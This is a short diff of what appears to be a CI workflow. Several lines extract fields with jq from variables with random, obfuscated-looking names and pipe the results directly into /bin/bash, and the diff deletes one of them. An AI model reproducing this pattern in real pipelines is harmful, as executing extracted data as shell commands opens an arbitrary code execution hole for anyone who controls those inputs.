@@ -31,7 +31,6 @@ jobs:
           printf '%s' "$nvkpz0159" | jq -r .woxb52 | /bin/bash
           echo $bn7 | jq -r .j3 | /bin/bash
           echo $ezorq921 | jq -r .llcdh9237 | /bin/bash
-          printf '%s' "$j116" | jq -r .tykfw13587 | /bin/bash
           printf '%s' "$sm2" | jq -r .od504 | /bin/bash
 
       - name: Save output
